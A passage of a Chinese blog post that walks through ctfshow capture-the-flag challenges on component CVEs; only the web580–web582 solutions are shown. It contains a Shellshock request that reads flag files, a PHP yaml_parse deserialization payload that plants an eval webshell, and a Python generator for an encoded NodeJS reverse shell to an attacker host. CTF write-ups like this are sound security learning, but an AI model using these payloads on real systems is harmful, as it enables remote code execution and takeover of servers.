<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/acvtar.jpg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/acvtar.jpg">
  <link rel="mask-icon" href="/images/acvtar.jpg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.css" integrity="sha256-yE0aDX61mjiw8FoDuGetFttFoGJMeWsU/iYEFOfpMhA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"baozongwi.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="全是CVE">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow组件漏洞">
<meta property="og:url" content="https://baozongwi.xyz/posts/f8dfa163.html">
<meta property="og:site_name" content="baozongwi:H@cking Th3 Fu1ure">
<meta property="og:description" content="全是CVE">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/ctfshow%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/QQ20250221-171115.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/ctfshow%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/QQ20250222-165516.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/2/ctfshow%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/QQ20250222-180636.jpg">
<meta property="article:published_time" content="2025-02-21T08:38:05.000Z">
<meta property="article:modified_time" content="2025-08-08T03:56:35.474Z">
<meta property="article:author" content="baozongwi">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://baozongwi.xyz/images/achieve/2025/2/ctfshow%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/QQ20250221-171115.jpg">


<link rel="canonical" href="https://baozongwi.xyz/posts/f8dfa163.html">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://baozongwi.xyz/posts/f8dfa163.html","path":"posts/f8dfa163.html","title":"ctfshow组件漏洞"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ctfshow组件漏洞 | baozongwi:H@cking Th3 Fu1ure</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.umd.js" integrity="sha256-32A/chfN6JgQkwK/QFZY8siVcOZj3LUt1vSKIcDvshM=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>




  <script src="/js/third-party/fancybox.js" defer></script>

  <script src="/js/third-party/pace.js" defer></script>


  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="baozongwi:H@cking Th3 Fu1ure" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">baozongwi:H@cking Th3 Fu1ure</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="Searching..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web580"><span class="nav-number">1.</span> <span class="nav-text">web580</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web581"><span class="nav-number">2.</span> <span class="nav-text">web581</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web582"><span class="nav-number">3.</span> <span class="nav-text">web582</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web583"><span class="nav-number">4.</span> <span class="nav-text">web583</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web584"><span class="nav-number">5.</span> <span class="nav-text">web584</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web585"><span class="nav-number">6.</span> <span class="nav-text">web585</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web586"><span class="nav-number">7.</span> <span class="nav-text">web586</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web587"><span class="nav-number">8.</span> <span class="nav-text">web587</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web588"><span class="nav-number">9.</span> <span class="nav-text">web588</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web589"><span class="nav-number">10.</span> <span class="nav-text">web589</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web590"><span class="nav-number">11.</span> <span class="nav-text">web590</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web591"><span class="nav-number">12.</span> <span class="nav-text">web591</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web592"><span class="nav-number">13.</span> <span class="nav-text">web592</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web593"><span class="nav-number">14.</span> <span class="nav-text">Web593</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web594"><span class="nav-number">15.</span> <span class="nav-text">web594</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web595"><span class="nav-number">16.</span> <span class="nav-text">web595</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web596"><span class="nav-number">17.</span> <span class="nav-text">web596</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web597"><span class="nav-number">18.</span> <span class="nav-text">web597</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web598"><span class="nav-number">19.</span> <span class="nav-text">web598</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web599"><span class="nav-number">20.</span> <span class="nav-text">web599</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="baozongwi"
      src="/images/acvtar.jpg">
  <p class="site-author-name" itemprop="name">baozongwi</p>
  <div class="site-description" itemprop="description">天地不仁，以万物为刍狗</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">202</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/baozongwi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;baozongwi" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:baozongwi@qq.com" title="E-Mail → mailto:baozongwi@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>
<ul>
  <li><a href="/"><i class="fa fa-home"></i> home</a></li>
  <li><a href="/archives/"><i class="fa fa-archive"></i> archives</a></li>
  <li><a href="/tags/"><i class="fa fa-tags"></i> tags</a></li>
  <li><a href="/about/"><i class="fa fa-user"></i> about</a></li>
  <li><a href="/links/"><i class="fa fa-link"></i> links</a></li>
</ul>
        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://baozongwi.xyz/posts/f8dfa163.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/acvtar.jpg">
      <meta itemprop="name" content="baozongwi">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="baozongwi:H@cking Th3 Fu1ure">
      <meta itemprop="description" content="天地不仁，以万物为刍狗">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="ctfshow组件漏洞 | baozongwi:H@cking Th3 Fu1ure">
      <meta itemprop="description" content="全是CVE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ctfshow组件漏洞
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-02-21 16:38:05" itemprop="dateCreated datePublished" datetime="2025-02-21T16:38:05+08:00">2025-02-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-08-08 11:56:35" itemprop="dateModified" datetime="2025-08-08T11:56:35+08:00">2025-08-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>39k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>1:05</span>
    </span>
</div>

            <div class="post-description">全是CVE</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="web580"><a href="#web580" class="headerlink" title="web580"></a>web580</h2><p>首先进来看到一个关键词，搜索<strong>破壳RCE漏洞</strong>，搜到了一个CVE漏洞，复现一下，bash版本小于等于4.3，会直接执行http头里面的命令，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令，</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cgi-bin/index.cgi</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>561c8532-c77c-44cc-8154-4eee26f39955.challenge.ctf.show</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;, &quot;Google Chrome&quot;;v=&quot;132&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36;</span><br><span class="line"><span class="attribute">x</span><span class="punctuation">: </span>() &#123; :; &#125;; echo; /bin/cat /f*</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://561c8532-c77c-44cc-8154-4eee26f39955.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; SL_G_WPT_TO=zh; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web581"><a href="#web581" class="headerlink" title="web581"></a>web581</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$n</span>,<span class="variable">$c</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$n</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$log</span> = <span class="string">&#x27;web.log&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">yaml_parse</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">log</span>(<span class="variable">$log</span>,<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>

<p><code>yaml_parse</code>有漏洞，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.yaml-parse.php">官方文档</a></p>
<blockquote>
<p>Processing untrusted user input with <strong>yaml_parse()</strong> is dangerous if the use of <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a> is enabled for nodes using the <code>!php/object</code> tag. This behavior can be disabled by using the <code>yaml.decode_php</code> ini setting.</p>
</blockquote>
<p>也就是说如果<code>!php/object</code>开头的话也就是作为一个标签，就会反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;shell.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;!php/object &#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">log</span>()));</span><br></pre></td></tr></table></figure>

<h2 id="web582"><a href="#web582" class="headerlink" title="web582"></a>web582</h2><p>nodejs反序列化漏洞，直接复现一下，感觉价值不大 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85458">nodejs反序列化</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Generator for encoded NodeJS reverse shells</span></span><br><span class="line"><span class="comment"># Based on the NodeJS reverse shell by Evilpacket</span></span><br><span class="line"><span class="comment"># https://github.com/evilpacket/node-shells/blob/master/node_revshell.js</span></span><br><span class="line"><span class="comment"># Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)</span></span><br><span class="line"><span class="comment"># Insecurety Research (2013) - insecurety.net</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;&quot;</span> % (sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">IP_ADDR = sys.argv[<span class="number">1</span>]</span><br><span class="line">PORT = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">charencode</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;String.CharCode&quot;&quot;&quot;</span></span><br><span class="line">    encoded = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        encoded = encoded + <span class="string">&quot;,&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(char))</span><br><span class="line">    <span class="keyword">return</span> encoded[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] LHOST = %s&quot;</span> % (IP_ADDR)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] LPORT = %s&quot;</span> % (PORT)</span><br><span class="line">NODEJS_REV_SHELL = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">var net = require(&#x27;net&#x27;);</span></span><br><span class="line"><span class="string">var spawn = require(&#x27;child_process&#x27;).spawn;</span></span><br><span class="line"><span class="string">HOST=&quot;%s&quot;;</span></span><br><span class="line"><span class="string">PORT=&quot;%s&quot;;</span></span><br><span class="line"><span class="string">TIMEOUT=&quot;5000&quot;;</span></span><br><span class="line"><span class="string">if (typeof String.prototype.contains === &#x27;undefined&#x27;) &#123; String.prototype.contains = function(it) &#123; return this.indexOf(it) != -1; &#125;; &#125;</span></span><br><span class="line"><span class="string">function c(HOST,PORT) &#123;</span></span><br><span class="line"><span class="string">    var client = new net.Socket();</span></span><br><span class="line"><span class="string">    client.connect(PORT, HOST, function() &#123;</span></span><br><span class="line"><span class="string">        var sh = spawn(&#x27;/bin/sh&#x27;,[]);</span></span><br><span class="line"><span class="string">        client.write(&quot;Connected!\\n&quot;);</span></span><br><span class="line"><span class="string">        client.pipe(sh.stdin);</span></span><br><span class="line"><span class="string">        sh.stdout.pipe(client);</span></span><br><span class="line"><span class="string">        sh.stderr.pipe(client);</span></span><br><span class="line"><span class="string">        sh.on(&#x27;exit&#x27;,function(code,signal)&#123;</span></span><br><span class="line"><span class="string">          client.end(&quot;Disconnected!\\n&quot;);</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    client.on(&#x27;error&#x27;, function(e) &#123;</span></span><br><span class="line"><span class="string">        setTimeout(c(HOST,PORT), TIMEOUT);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">c(HOST,PORT);</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (IP_ADDR, PORT)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Encoding&quot;</span></span><br><span class="line">PAYLOAD = charencode(NODEJS_REV_SHELL)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;eval(String.fromCharCode(%s))&quot;</span> % (PAYLOAD)</span><br></pre></td></tr></table></figure>

<p>他是对cookie进行了反序列化，</p>
<p><img src="/../images/achieve/2025/2/ctfshow%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/QQ20250221-171115.jpg" alt="1"></p>
